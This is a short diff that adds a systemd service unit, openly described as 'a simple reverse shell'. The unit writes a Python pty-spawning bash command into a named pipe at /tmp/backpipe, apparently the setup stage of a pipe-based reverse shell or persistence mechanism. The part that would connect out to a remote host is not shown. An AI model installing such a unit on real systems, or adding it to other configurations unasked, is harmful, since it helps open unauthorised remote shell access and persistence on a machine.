@@ -1,0 +1,8 @@
+; https://www.freedesktop.org/software/systemd/man/systemd.service.html
+[Unit]
+Description=A simple reverse shell - initializing the pipe
+
+[Service]
+Type=oneshot
+StandardOutput=file:/tmp/backpipe
+ExecStart=/usr/bin/echo "python -c \"import pty;pty.spawn('/bin/bash')\""
